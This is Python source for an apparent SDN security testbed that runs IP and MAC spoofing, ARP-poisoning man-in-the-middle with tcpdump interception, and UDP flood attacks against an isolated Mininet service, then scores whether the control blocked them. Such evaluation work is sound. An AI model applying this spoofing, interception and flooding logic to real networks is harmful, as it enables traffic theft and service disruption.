def _technical_result(
    cfg: AttackConfig,
    mechanism: str,
    error_type: str,
    message: str,
    metrics: Optional[Dict[str, Any]] = None,
) -> AttackResult:
    payload = dict(metrics or {})
    payload.update(
        {
            "attack_type": cfg.attack_type,
            "protocol_id": PROTOCOL_ID,
            "actual_mechanism": mechanism,
            "mode": cfg.mfa_mode,
            "binding_profile": cfg.binding_profile,
            "topology_id": cfg.topology_id,
            "campaign_id": cfg.campaign_id,
            "task_id": cfg.task_id,
            "sample_id": cfg.sample_id,
            "repetition": cfg.repetition,
            "intensity_level": cfg.intensity_level,
            "run_id": cfg.run_id,
            "attempt_id": cfg.attempt_id,
            "is_valid": False,
            "execution_status": "technical_error",
            "security_outcome": "not_evaluable",
            "error_type": error_type,
        }
    )
    return AttackResult(success=False, message=message, metrics=payload)


def _valid_result(
    cfg: AttackConfig,
    mechanism: str,
    success: bool,
    outcome: str,
    message: str,
    metrics: Optional[Dict[str, Any]] = None,
) -> AttackResult:
    payload = dict(metrics or {})
    payload.update(
        {
            "attack_type": cfg.attack_type,
            "protocol_id": PROTOCOL_ID,
            "actual_mechanism": mechanism,
            "mode": cfg.mfa_mode,
            "binding_profile": cfg.binding_profile,
            "topology_id": cfg.topology_id,
            "campaign_id": cfg.campaign_id,
            "task_id": cfg.task_id,
            "sample_id": cfg.sample_id,
            "repetition": cfg.repetition,
            "intensity_level": cfg.intensity_level,
            "run_id": cfg.run_id,
            "attempt_id": cfg.attempt_id,
            "is_valid": True,
            "execution_status": "completed",
            "security_outcome": outcome,
            "error_type": None,
        }
    )
    return AttackResult(success=bool(success), message=message, metrics=payload)


def _classify_access_probe(
    probe: Dict[str, Any],
    diagnostics: Dict[str, Any],
    controller_deny_evidence: Optional[Dict[str, Any]] = None,
) -> str:
    if probe.get("accessible"):
        return "attack_success"
    if diagnostics.get("neighbor_state") not in GOOD_NEIGHBOR_STATES:
        return "technical_error"
    evidence = controller_deny_evidence or {}
    if bool(evidence.get("available")) and int(evidence.get("count") or 0) > 0:
        return "attack_blocked"
    # A timeout by itself is not proof that the security control blocked the
    # request. Without a matching controller denial it remains non-evaluable.
    return "technical_error"


def _arp_capture_assessment(
    attack_probe: Dict[str, Any], captured_text: str
) -> Dict[str, bool]:
    """Separate endpoint access from observed MITM confidentiality exposure."""
    endpoint_accessible = bool(attack_probe.get("accessible"))
    confidentiality_exposed = SENSITIVE_TEXT in str(captured_text or "")
    return {
        "legitimate_request_accessible": endpoint_accessible,
        "confidentiality_exposed": confidentiality_exposed,
        # A successful endpoint request should traverse the verified poisoned
        # path.  If the protected response is not present in a healthy capture,
        # absence of evidence must not be classified as a security block.
        "capture_inconclusive": endpoint_accessible and not confidentiality_exposed,
    }


@dataclass
class AttackMeta:
    display_name: str
    key: str


class AttackManager:
    def __init__(self):
        self._attacks: Dict[str, Callable[[AttackConfig], AttackResult]] = {
            "unauthorized_access": self._attack_direct,
            "ip_spoofing": self._attack_ip_spoof,
            "ip_mac_spoofing": self._attack_ip_mac_spoof,
            "arp_mitm": self._attack_arp_mitm,
            "dos_udp_flood": self._attack_dos,
            "ddos_udp_flood": self._attack_ddos,
        }
        self._display: Dict[int, AttackMeta] = {
            index: AttackMeta(str(SCENARIO_SPECS[key]["display_name"]), key)
            for index, key in enumerate(DISPLAY_SCENARIO_ORDER, start=1)
        }
        if set(self._attacks) != set(SCENARIO_SPECS):
            raise RuntimeError("Scenario handlers and the versioned protocol are out of sync")

    def get_available_attacks(self) -> List[str]:
        return list(self._attacks.keys())

    def get_available_attacks_display(self) -> Dict[int, Tuple[str, str]]:
        return {key: (meta.display_name, meta.key) for key, meta in self._display.items()}

    def execute_attack(self, attack_type: str, cfg: AttackConfig) -> AttackResult:
        if attack_type not in self._attacks:
            return _technical_result(
                cfg,
                "unknown",
                "unknown_attack",
                "Unknown attack type: %s" % attack_type,
            )
        try:
            duration_s = int(cfg.duration_s)
            rate_pps = int(cfg.rate_pps)
            worker_count = int(cfg.threads)
            target_port = int(cfg.target_port)
        except (TypeError, ValueError):
            return _technical_result(
                cfg,
                self._mechanism_for(attack_type),
                "invalid_parameter_type",
                "Scenario duration, rate, worker count, and target port must be integers",
            )
        if not (1 <= duration_s <= 120):
            return _technical_result(
                cfg,
                self._mechanism_for(attack_type),
                "invalid_duration",
                "Duration must be between 1 and 120 seconds",
            )
        if not (1 <= rate_pps <= 100000):
            return _technical_result(
                cfg,
                self._mechanism_for(attack_type),
                "invalid_rate",
                "Rate must be between 1 and 100000 packets/s",
            )
        if not (1 <= worker_count <= 16):
            return _technical_result(
                cfg,
                self._mechanism_for(attack_type),
                "invalid_worker_count",
                "Worker count must be between 1 and 16",
            )
        parameter_errors = protocol_parameter_errors(
            attack_type,
            duration_seconds=cfg.duration_s,
            rate_pps=cfg.rate_pps,
            worker_count=cfg.threads,
            payload_size_bytes=cfg.payload_size_bytes,
            target_host=cfg.target_host,
            target_port=target_port,
            intensity_level=cfg.intensity_level,
            request_count=cfg.request_count,
            source_count=cfg.source_count,
        )
        if parameter_errors:
            return _technical_result(
                cfg,
                self._mechanism_for(attack_type),
                "protocol_parameter_mismatch",
                "Scenario parameters are outside the declared protocol ranges",
                {
                    "protocol_parameter_errors": parameter_errors,
                    "expected_parameters": dict(SCENARIO_SPECS[attack_type]),
                },
            )
        try:
            return self._attacks[attack_type](cfg)
        except KeyboardInterrupt:
            raise
        except Exception as exc:
            return _technical_result(
                cfg,
                self._mechanism_for(attack_type),
                "unhandled_execution_error",
                "Attack execution error: %s" % exc,
                {"exception": str(exc)},
            )

    @staticmethod
    def _mechanism_for(attack_type: str) -> str:
        spec = SCENARIO_SPECS.get(attack_type)
        return str(spec.get("mechanism")) if spec else "unknown"

    def _prepare_with_preflight(self, cfg: AttackConfig, mechanism: str):
        mn = _read_mn()
        expected_host = str(mn["sensitive"]["host"])
        expected_port = int(mn["sensitive"]["port"])
        if str(cfg.target_host) != expected_host or int(cfg.target_port) != expected_port:
            return mn, {}, _technical_result(
                cfg,
                mechanism,
                "target_outside_isolated_scenario",
                "The scenario target must match the protected Mininet service",
                {
                    "requested_target": "%s:%s" % (cfg.target_host, cfg.target_port),
                    "expected_target": "%s:%s" % (expected_host, expected_port),
                },
            )
        checks = _preflight(mn)
        if not checks["valid"]:
            return mn, checks, _technical_result(
                cfg,
                mechanism,
                str(checks.get("error_type") or "preflight_failed"),
                "Preflight control failed; the security outcome is not evaluable",
                {"preflight": checks},
            )
        return mn, checks, None

    def _complete_access_result(
        self,
        cfg: AttackConfig,
        mechanism: str,
        preflight: Dict[str, Any],
        attack_probe: Dict[str, Any],
        diagnostics: Dict[str, Any],
        postflight: Dict[str, Any],
        controller_deny_evidence: Optional[Dict[str, Any]] = None,
        restore_error: Optional[str] = None,
    ) -> AttackResult:
        metrics = {
            "preflight": preflight,
            "attack_probe": attack_probe,
            "network_diagnostics": diagnostics,
            "postflight": postflight,
            "controller_deny_evidence": controller_deny_evidence
            or {
                "available": False,
                "count": 0,
                "events": [],
                "error": "not_collected",
            },
        }
        if restore_error:
            metrics["restore_error"] = restore_error
            return _technical_result(
                cfg,
                mechanism,
                "identity_restore_failed",
                "Host identity restoration failed; the run is invalid",
                metrics,
            )
        if not postflight.get("valid"):
            return _technical_result(
                cfg,
                mechanism,
                "postflight_control_failed",
                "Legitimate access did not recover after the scenario",
                metrics,
            )

        classification = _classify_access_probe(
            attack_probe,
            diagnostics,
            controller_deny_evidence=metrics["controller_deny_evidence"],
        )
        if classification == "technical_error":
            return _technical_result(
                cfg,
                mechanism,
                "attack_transport_indeterminate",
                "The attack request failed for a technical reason; it is not counted as blocked",
                metrics,
            )
        if classification == "attack_success":
            return _valid_result(
                cfg,
                mechanism,
                True,
                "attack_success",
                "Sensitive resource was accessed by the attack source",
                metrics,
            )
        evidence = metrics["controller_deny_evidence"]
        reasons = sorted(
            {
                str(item.get("reason"))
                for item in evidence.get("events", [])
                if isinstance(item, dict) and item.get("reason")
            }
        )
        reason_suffix = (
            " (controller evidence: %s)" % ", ".join(reasons)
            if reasons
            else ""
        )
        return _valid_result(
            cfg,
            mechanism,
            False,
            "attack_blocked",
            "Attack request was blocked while the legitimate control remained available%s"
            % reason_suffix,
            metrics,
        )

    def _attack_direct(self, cfg: AttackConfig) -> AttackResult:
        mechanism = "direct_access"
        mn, checks, failed = self._prepare_with_preflight(cfg, mechanism)
        if failed:
            return failed
        h3 = _mn_pid(mn, "h3")
        url = str(mn["sensitive"]["path"])
        probe_started = time.time()
        attack_probe = _http_attempt_series(h3, cfg, url)
        deny_evidence = _controller_deny_evidence(
            probe_started,
            src_ip=str(mn["h3"]["ip"]),
        )
        diagnostics = _network_diagnostics(h3, str(mn["sensitive"]["host"]))
        post = _postflight(mn)
        return self._complete_access_result(
            cfg,
            mechanism,
            checks,
            attack_probe,
            diagnostics,
            post,
            controller_deny_evidence=deny_evidence,
        )

    def _run_spoof(self, cfg: AttackConfig, spoof_mac: bool) -> AttackResult:
        mechanism = "ip_mac_spoof" if spoof_mac else "ip_spoof"
        mn, checks, failed = self._prepare_with_preflight(cfg, mechanism)
        if failed:
            return failed

        h1 = _mn_pid(mn, "h1")
        h2 = _mn_pid(mn, "h2")
        h3 = _mn_pid(mn, "h3")
        h1_ip = str(mn["h1"]["ip"])
        h1_mac = str(mn["h1"]["mac"]).lower()
        h2_mac = str(mn["h2"]["mac"]).lower()
        destination_ip = str(mn["sensitive"]["host"])
        url = str(mn["sensitive"]["path"])
        original_ip = _get_ip(h3)
        original_mac = _get_mac(h3)
        attack_mac = h1_mac if spoof_mac else original_mac
        attack_probe: Dict[str, Any] = {}
        diagnostics: Dict[str, Any] = {}
        deny_evidence: Dict[str, Any] = {
            "available": False,
            "count": 0,
            "events": [],
            "error": "not_collected",
        }
        restore_errors: List[str] = []
        h1_ipv4_suspended = False
        h3_ipv4_suspended = False
        spoof_iface: Optional[str] = None

        try:
            _suspend_ipv4(h1)
            h1_ipv4_suspended = True
            h3_parent_iface = _suspend_ipv4(h3)
            h3_ipv4_suspended = True
            if spoof_mac:
                spoof_iface = _create_spoof_interface(
                    h3, h3_parent_iface, h1_ip, h1_mac
                )
            else:
                _set_identity(h3, ip=h1_ip)
            # Install both neighbour entries explicitly while the identity is
            # moved so the request cannot fail with an INCOMPLETE ARP state.
            _replace_neigh(
                h3, destination_ip, h2_mac, interface=spoof_iface or h3_parent_iface
            )
            _replace_neigh(h2, h1_ip, attack_mac)
            time.sleep(0.25)
            probe_started = time.time()
            attack_probe = _http_attempt_series(h3, cfg, url)
            deny_evidence = _controller_deny_evidence(
                probe_started,
                src_ip=h1_ip,
            )
            diagnostics = _network_diagnostics(
                h3, destination_ip, interface=spoof_iface or h3_parent_iface
            )
        except Exception as exc:
            diagnostics = {"setup_or_execution_error": str(exc)}
        finally:
            if spoof_iface:
                try:
                    _delete_spoof_interface(h3, spoof_iface)
                except Exception as exc:
                    restore_errors.append("h3 spoof interface: %s" % exc)
            try:
                if h3_ipv4_suspended:
                    _set_identity(h3, ip=original_ip)
                if _get_mac(h3) != original_mac:
                    raise RuntimeError("attacker MAC changed unexpectedly")
                _replace_neigh(h3, destination_ip, h2_mac)
            except Exception as exc:
                restore_errors.append("h3: %s" % exc)
            try:
                if h1_ipv4_suspended:
                    _set_identity(h1, ip=h1_ip)
                _replace_neigh(h1, destination_ip, h2_mac)
                _replace_neigh(h2, h1_ip, h1_mac)
                refreshed = _refresh_controller_forwarding()
                if not refreshed.get("ok"):
                    raise RuntimeError(
                        "controller forwarding refresh failed: %s" % refreshed
                    )
            except Exception as exc:
                restore_errors.append("h1: %s" % exc)
            time.sleep(1.0)

        if not attack_probe:
            return _technical_result(
                cfg,
                mechanism,
                "spoof_setup_failed",
                "Spoofing setup or request execution failed",
                {
                    "preflight": checks,
                    "network_diagnostics": diagnostics,
                    "restore_error": "; ".join(restore_errors) or None,
                },
            )

        post = _postflight(mn)
        return self._complete_access_result(
            cfg,
            mechanism,
            checks,
            attack_probe,
            diagnostics,
            post,
            controller_deny_evidence=deny_evidence,
            restore_error="; ".join(restore_errors) or None,
        )

    def _attack_ip_spoof(self, cfg: AttackConfig) -> AttackResult:
        return self._run_spoof(cfg, spoof_mac=False)

    def _attack_ip_mac_spoof(self, cfg: AttackConfig) -> AttackResult:
        return self._run_spoof(cfg, spoof_mac=True)

    def _attack_arp_mitm(self, cfg: AttackConfig) -> AttackResult:
        """Perform and verify a bidirectional ARP-poisoning attempt in Mininet."""
        mechanism = "arp_mitm"
        mn, checks, failed = self._prepare_with_preflight(cfg, mechanism)
        if failed:
            return failed

        h1 = _mn_pid(mn, "h1")
        h2 = _mn_pid(mn, "h2")
        h3 = _mn_pid(mn, "h3")
        h1_ip, h1_mac = str(mn["h1"]["ip"]), str(mn["h1"]["mac"]).lower()
        h2_ip, h2_mac = str(mn["h2"]["ip"]), str(mn["h2"]["mac"]).lower()
        h3_mac = str(mn["h3"]["mac"]).lower()
        h3_iface = _get_iface(h3)
        url = str(mn["sensitive"]["path"])
        poison_process = None
        capture_process = None
        poison_result: Dict[str, Any] = {}
        capture_stderr = ""
        captured_text = ""
        attack_probe: Dict[str, Any] = {}
        poisoning_verified = False
        restoration_verified = False
        baseline_arp_state: Dict[str, Any] = {}
        poisoned_arp_state: Dict[str, Any] = {}
        restored_arp_state: Dict[str, Any] = {}
        restore_errors: List[str] = []
        old_forward = "0"
        old_rp_filter = "1"
        probe_started = 0.0

        try:
            # The shared preflight deliberately installs permanent neighbour
            # entries for deterministic controls.  Permanent entries reject
            # unsolicited ARP updates, so this scenario first replaces only
            # the two endpoint entries with a verified dynamic baseline.
            baseline_arp_state = _prime_arp_pair(
                h1, h2, h1_ip, h1_mac, h2_ip, h2_mac
            )
            if not baseline_arp_state.get("verified"):
                raise RuntimeError(
                    "The legitimate bidirectional ARP baseline could not be verified"
                )

            forward_result = _ns_exec(h3, ["sysctl", "-n", "net.ipv4.ip_forward"], timeout=2)
            rp_result = _ns_exec(h3, ["sysctl", "-n", "net.ipv4.conf.all.rp_filter"], timeout=2)
            old_forward = str(forward_result.get("stdout") or "0").strip() or "0"
            old_rp_filter = str(rp_result.get("stdout") or "1").strip() or "1"
            _require_command(
                _ns_exec(h3, ["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=2),
                "Enable IP forwarding",
            )
            _require_command(
                _ns_exec(h3, ["sysctl", "-w", "net.ipv4.conf.all.rp_filter=0"], timeout=2),
                "Disable reverse-path filtering",
            )

            capture_process = subprocess.Popen(
                [
                    "mnexec", "-a", str(h3), "tcpdump", "-l", "-A", "-n", "-s", "0",
                    "-i", h3_iface, "tcp", "port", str(int(cfg.target_port)),
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            time.sleep(0.25)
            if capture_process.poll() is not None:
                _, capture_stderr = capture_process.communicate()
                raise RuntimeError("tcpdump could not start: %s" % capture_stderr[-300:])

            env = os.environ.copy()
            env.update(
                {
                    "SDNMFA_INTERFACE": h3_iface,
                    "SDNMFA_ATTACKER_MAC": h3_mac,
                    "SDNMFA_DURATION": str(float(cfg.duration_s) + 2.0),
                    "SDNMFA_ARP_TARGETS": json.dumps(
                        [
                            {"target_mac": h1_mac, "target_ip": h1_ip, "spoof_ip": h2_ip},
                            {"target_mac": h2_mac, "target_ip": h2_ip, "spoof_ip": h1_ip},
                        ],
                        sort_keys=True,
                    ),
                }
            )
            poison_process = subprocess.Popen(
                ["mnexec", "-a", str(h3), "python3", "-c", ARP_POISON_CODE],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env=env,
            )
            poisoned_arp_state = _wait_for_arp_pair(
                h1,
                h2,
                h1_ip,
                h1_mac,
                h2_ip,
                h2_mac,
                h3_mac,
                h3_mac,
            )
            poisoning_verified = bool(poisoned_arp_state.get("verified"))
            if not poisoning_verified:
                raise RuntimeError(
                    "ARP cache change was not observed on both endpoints; the run is not evaluable"
                )

            probe_started = time.time()
            attack_probe = _http_attempt_series(h1, cfg, url)
        except Exception as exc:
            attack_probe.setdefault("setup_or_execution_error", str(exc))
        finally:
            if poison_process is not None:
                stdout, stderr, cleanup_warning = _terminate_process(
                    poison_process, "ARP poison process"
                )
                for line in reversed(stdout.splitlines()):
                    try:
                        candidate = json.loads(line)
                    except (TypeError, ValueError):
                        continue
                    if isinstance(candidate, dict):
                        poison_result = candidate
                        break
                if stderr:
                    poison_result["stderr"] = stderr[-500:]
                if cleanup_warning:
                    restore_errors.append(cleanup_warning)
            if capture_process is not None:
                captured_text, capture_stderr, cleanup_warning = _terminate_process(
                    capture_process, "ARP capture process"
                )
                if cleanup_warning:
                    restore_errors.append(cleanup_warning)
            try:
                restored_arp_state = _restore_arp_pair(
                    h1, h2, h1_ip, h1_mac, h2_ip, h2_mac
                )
                restoration_verified = bool(restored_arp_state.get("verified"))
                if not restoration_verified:
                    restore_errors.append(
                        "neighbor restoration did not reproduce both legitimate mappings"
                    )
            except Exception as exc:
                restore_errors.append("neighbor restoration: %s" % exc)
            for setting, value in (
                ("net.ipv4.ip_forward", old_forward),
                ("net.ipv4.conf.all.rp_filter", old_rp_filter),
            ):
                try:
                    _require_command(
                        _ns_exec(h3, ["sysctl", "-w", "%s=%s" % (setting, value)], timeout=2),
                        "Restore %s" % setting,
                    )
                except Exception as exc:
                    restore_errors.append("%s: %s" % (setting, exc))
            time.sleep(0.6)

        if not poisoning_verified or not attack_probe.get("samples"):
            return _technical_result(
                cfg,
                mechanism,
                "arp_mitm_setup_failed",
                "The ARP-poisoning controls were not established and verified",
                {
                    "preflight": checks,
                    "attack_probe": attack_probe,
                    "baseline_arp_state": baseline_arp_state,
                    "poisoned_arp_state": poisoned_arp_state,
                    "restored_arp_state": restored_arp_state,
                    "poisoning_verified": poisoning_verified,
                    "restoration_verified": restoration_verified,
                    "poison_result": poison_result,
                    "capture_stderr": capture_stderr[-500:] if capture_stderr else None,
                    "restore_error": "; ".join(restore_errors) or None,
                },
            )

        capture_assessment = _arp_capture_assessment(attack_probe, captured_text)
        confidentiality_exposed = capture_assessment["confidentiality_exposed"]
        attack_probe.update(capture_assessment)
        attack_probe["accessible"] = confidentiality_exposed
        deny_evidence = _controller_deny_evidence(probe_started, src_ip=h1_ip)
        diagnostics = _network_diagnostics(h3, h2_ip)
        post = _postflight(mn)
        result = self._complete_access_result(
            cfg,
            mechanism,
            checks,
            attack_probe,
            diagnostics,
            post,
            controller_deny_evidence=deny_evidence,
            restore_error="; ".join(restore_errors) or None,
        )
        if capture_assessment["capture_inconclusive"] and result.metrics.get("is_valid"):
            result = _technical_result(
                cfg,
                mechanism,
                "arp_capture_inconclusive",
                "The endpoint received the protected response, but the verified MITM capture "
                "did not contain enough payload evidence for a confidentiality verdict",
                result.metrics,
            )
        result.metrics["arp_poisoning_verified"] = True
        result.metrics["arp_restoration_verified"] = restoration_verified
        result.metrics["arp_baseline_state"] = baseline_arp_state
        result.metrics["arp_poisoned_state"] = poisoned_arp_state
        result.metrics["arp_restored_state"] = restored_arp_state
        result.metrics["arp_replies_sent"] = poison_result.get("arp_replies_sent")
        result.metrics["arp_replies_by_target"] = poison_result.get(
            "arp_replies_by_target"
        )
        result.metrics["capture_contains_protected_payload"] = confidentiality_exposed
        result.metrics["capture_bytes_inspected"] = len(captured_text.encode("utf-8", errors="ignore"))
        return result

    def _launch_flood_workers(
        self,
        source_pids: List[int],
        cfg: AttackConfig,
        payload_size: int,
        start_at: float,
    ):
        processes = []
        worker_count = len(source_pids)
        per_worker_rate = float(cfg.rate_pps) / float(worker_count)
        try:
            for host_pid in source_pids:
                env = os.environ.copy()
                env.update(
                    {
                        "SDNMFA_DST": str(cfg.target_host),
                        "SDNMFA_PORT": str(int(cfg.target_port)),
                        "SDNMFA_DURATION": str(float(cfg.duration_s)),
                        "SDNMFA_RATE": str(per_worker_rate),
                        "SDNMFA_PAYLOAD": str(int(payload_size)),
                        "SDNMFA_START_AT": str(float(start_at)),
                    }
                )
                processes.append(
                    subprocess.Popen(
                        [
                            "mnexec",
                            "-a",
                            str(host_pid),
                            "python3",
                            "-c",
                            FLOOD_WORKER_CODE,
                        ],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        env=env,
                    )
                )
        except Exception:
            for process in processes:
                process.kill()
                process.communicate()
            raise
        return processes

    @staticmethod
    def _launch_flood_receiver(
        h2_pid: int,
        cfg: AttackConfig,
        start_at: float,
    ):
        env = os.environ.copy()
        env.update(
            {
                "SDNMFA_PORT": str(int(cfg.target_port)),
                "SDNMFA_DURATION": str(float(cfg.duration_s)),
                "SDNMFA_START_AT": str(float(start_at)),
            }
        )
        return subprocess.Popen(
            ["mnexec", "-a", str(h2_pid), "python3", "-c", FLOOD_RECEIVER_CODE],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            env=env,
        )

    @staticmethod
    def _collect_json_process(process, timeout_s: float, label: str) -> Dict[str, Any]:
        try:
            stdout, stderr = process.communicate(timeout=timeout_s)
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            return {
                "return_code": 124,
                "stderr": "%s timeout: %s" % (label, stderr or ""),
            }
        parsed: Dict[str, Any] = {}
        for line in reversed((stdout or "").splitlines()):
            try:
                candidate = json.loads(line)
            except (TypeError, ValueError):
                continue
            if isinstance(candidate, dict):
                parsed = candidate
                break
        parsed["return_code"] = int(process.returncode or 0)
        parsed["stderr"] = (stderr or "")[:500]
        return parsed

    @staticmethod
    def _collect_flood_workers(processes, timeout_s: float):
        return [
            AttackManager._collect_json_process(process, timeout_s, "worker")
            for process in processes
        ]

    def _attack_flood(self, cfg: AttackConfig, distributed_simulation: bool) -> AttackResult:
        mechanism = (
            "udp_flood_multi_source"
            if distributed_simulation
            else "udp_flood_single_source"
        )
        mn, checks, failed = self._prepare_with_preflight(cfg, mechanism)
        if failed:
            return failed

        h1 = _mn_pid(mn, "h1")
        h2 = _mn_pid(mn, "h2")
        protected_url = str(mn["sensitive"]["path"])
        declared_sources = (
            list((mn.get("roles") or {}).get("attack_source") or [])
            if isinstance(mn.get("roles"), dict)
            else []
        )
        if not declared_sources:
            declared_sources = [name for name in ("h3", "h4", "h5") if name in mn]
        required_sources = 3 if distributed_simulation else 1
        if len(declared_sources) < required_sources:
            return _technical_result(
                cfg,
                mechanism,
                "insufficient_distinct_sources",
                "The topology does not provide the declared number of distinct attack sources",
                {"available_attack_sources": declared_sources},
            )
        source_hosts = declared_sources[:required_sources]
        source_pids = [_mn_pid(mn, name) for name in source_hosts]
        worker_count = len(source_pids)
        payload_size = int(cfg.payload_size_bytes or 0)

        baseline = _probe_series(
            h1, protected_url, CONTROL_PROBE_COUNT, "baseline", timeout_s=1.0
        )
        if _availability_rate(baseline) < MIN_CONTROL_AVAILABILITY:
            return _technical_result(
                cfg,
                mechanism,
                "flood_baseline_failed",
                "Availability baseline failed before traffic generation",
                {"preflight": checks, "baseline_samples": baseline},
            )

        start_at_wall = time.time() + 0.75
        receiver = None
        receiver_launch_error = None
        try:
            receiver = self._launch_flood_receiver(h2, cfg, start_at_wall)
        except Exception as exc:
            receiver_launch_error = str(exc)
        try:
            processes = self._launch_flood_workers(
                source_pids,
                cfg,
                payload_size=payload_size,
                start_at=start_at_wall,
            )
        except Exception as exc:
            if receiver is not None:
                receiver.kill()
                receiver.communicate()
            return _technical_result(
                cfg,
                mechanism,
                "flood_worker_launch_failed",
                "Traffic-generation workers could not be started",
                {
                    "preflight": checks,
                    "worker_launch_error": str(exc),
                    "receiver_launch_error": receiver_launch_error,
                },
            )
        while time.time() < start_at_wall:
            time.sleep(0.005)
        flood_reference = time.monotonic()

        during: List[Dict[str, Any]] = []
        deadline = flood_reference + float(cfg.duration_s)
        monitor_error = None
        try:
            while time.monotonic() < deadline:
                sample = _probe_series(
                    h1,
                    protected_url,
                    1,
                    "during",
                    timeout_s=min(1.0, max(0.3, float(cfg.duration_s) / 4.0)),
                    interval_s=0.0,
                )[0]
                during.append(sample)
                remaining = deadline - time.monotonic()
                if remaining > 0:
                    time.sleep(min(0.25, remaining))
        except Exception as exc:
            monitor_error = str(exc)

        worker_results = self._collect_flood_workers(
            processes,
            timeout_s=max(5.0, float(cfg.duration_s) + 2.0),
        )
        receiver_result = (
            self._collect_json_process(
                receiver,
                timeout_s=max(5.0, float(cfg.duration_s) + 2.0),
                label="receiver",
            )
            if receiver is not None
            else {
                "return_code": 127,
                "stderr": receiver_launch_error or "receiver_not_started",
            }
        )
        time.sleep(0.5)
        recovery = _probe_series(
            h1, protected_url, CONTROL_PROBE_COUNT, "recovery", timeout_s=1.5
        )

        workers_valid = bool(worker_results) and all(
            int(item.get("return_code", 1)) == 0
            and int(item.get("packets_sent", 0)) > 0
            and int(item.get("send_errors", 0)) == 0
            for item in worker_results
        )
        packets_sent = sum(int(item.get("packets_sent", 0)) for item in worker_results)
        bytes_sent = sum(int(item.get("bytes_sent", 0)) for item in worker_results)
        send_errors = sum(int(item.get("send_errors", 0)) for item in worker_results)
        worker_duration = max(
            [float(item.get("duration_seconds", 0.0)) for item in worker_results] or [0.0]
        )
        actual_rate = packets_sent / worker_duration if worker_duration > 0 else 0.0
        target_achievement = (
            (actual_rate / float(cfg.rate_pps)) * 100.0 if cfg.rate_pps > 0 else 0.0
        )
        receiver_valid = (
            int(receiver_result.get("return_code", 1)) == 0
            and float(receiver_result.get("duration_seconds", 0.0)) > 0.0
        )
        packets_received = int(receiver_result.get("packets_received", 0))
        bytes_received = int(receiver_result.get("bytes_received", 0))
        actual_receive_rate = float(receiver_result.get("actual_receive_rate_pps", 0.0))
        delivery_percent = (
            min(100.0, (packets_received / float(packets_sent)) * 100.0)
            if packets_sent > 0
            else None
        )

        all_samples = baseline + during + recovery
        public_samples = _public_samples(all_samples, flood_reference)
        baseline_rate = _availability_rate(baseline)
        during_rate = _availability_rate(during)
        recovery_rate = _availability_rate(recovery)
        metrics = {
            "preflight": checks,
            "postflight": {
                "valid": recovery_rate >= MIN_CONTROL_AVAILABILITY,
                "rate": round(recovery_rate, 4),
                "minimum_rate": MIN_CONTROL_AVAILABILITY,
                "samples": recovery,
            },
            "worker_model": "one_process_per_distinct_source",
            "source_hosts": source_hosts,
            "source_ips": [str(mn[name]["ip"]) for name in source_hosts],
            "distinct_source_count": len(source_hosts),
            "worker_count": worker_count,
            "requested_threads": int(cfg.threads),
            "requested_duration_seconds": int(cfg.duration_s),
            "target_rate_pps": int(cfg.rate_pps),
            "actual_rate_pps": round(actual_rate, 3),
            "rate_achievement_percent": round(target_achievement, 3),
            "duration_seconds": worker_duration,
            "payload_size_bytes": payload_size,
            "packets_sent": packets_sent,
            "bytes_sent": bytes_sent,
            "send_errors": send_errors,
            "worker_results": worker_results,
            "receiver_evidence_valid": receiver_valid,
            "receiver_result": receiver_result,
            "packets_received": packets_received if receiver_valid else None,
            "bytes_received": bytes_received if receiver_valid else None,
            "actual_receive_rate_pps": (
                round(actual_receive_rate, 3) if receiver_valid else None
            ),
            "packet_delivery_percent": (
                round(delivery_percent, 3)
                if receiver_valid and delivery_percent is not None
                else None
            ),
            "availability_samples": public_samples,
            "baseline_availability_rate": round(baseline_rate, 4),
            "during_availability_rate": round(during_rate, 4),
            "recovery_availability_rate": round(recovery_rate, 4),
            "availability_degradation_margin": AVAILABILITY_DEGRADATION_MARGIN,
        }
        if monitor_error:
            metrics["monitor_error"] = monitor_error
            return _technical_result(
                cfg,
                mechanism,
                "availability_monitor_failed",
                "Availability sampling failed during traffic generation",
                metrics,
            )
        if not workers_valid:
            return _technical_result(
                cfg,
                mechanism,
                "flood_worker_failed",
                "One or more traffic-generation workers failed; the run is invalid",
                metrics,
            )
        if not receiver_valid:
            return _technical_result(
                cfg,
                mechanism,
                "flood_receiver_failed",
                "The target-side UDP receiver did not produce valid delivery evidence",
                metrics,
            )
        if not (
            MIN_RATE_ACHIEVEMENT_PERCENT
            <= target_achievement
            <= MAX_RATE_ACHIEVEMENT_PERCENT
        ):
            metrics["accepted_rate_achievement_percent"] = [
                MIN_RATE_ACHIEVEMENT_PERCENT,
                MAX_RATE_ACHIEVEMENT_PERCENT,
            ]
            return _technical_result(
                cfg,
                mechanism,
                "flood_rate_not_achieved",
                "Measured offered rate was outside the declared acceptance tolerance",
                metrics,
            )

        during_drop = max(0.0, baseline_rate - during_rate)
        recovery_drop = max(0.0, baseline_rate - recovery_rate)
        degraded_during = during_drop >= AVAILABILITY_DEGRADATION_MARGIN
        degraded_recovery = recovery_drop >= AVAILABILITY_DEGRADATION_MARGIN
        metrics["during_availability_drop"] = round(during_drop, 4)
        metrics["recovery_availability_drop"] = round(recovery_drop, 4)
        metrics["degraded_during"] = degraded_during
        metrics["degraded_recovery"] = degraded_recovery
        degraded = degraded_during or degraded_recovery
        if degraded:
            affected_phases = []
            if degraded_during:
                affected_phases.append("during")
            if degraded_recovery:
                affected_phases.append("recovery")
            return _valid_result(
                cfg,
                mechanism,
                True,
                "availability_degraded",
                "Service availability decreased in phase(s): %s"
                % ", ".join(affected_phases),
                metrics,
            )
        return _valid_result(
            cfg,
            mechanism,
            False,
            "availability_preserved",
            "Service availability was preserved during the UDP flood",
            metrics,
        )

    def _attack_dos(self, cfg: AttackConfig) -> AttackResult:
        return self._attack_flood(cfg, distributed_simulation=False)

    def _attack_ddos(self, cfg: AttackConfig) -> AttackResult:
        return self._attack_flood(cfg, distributed_simulation=True)
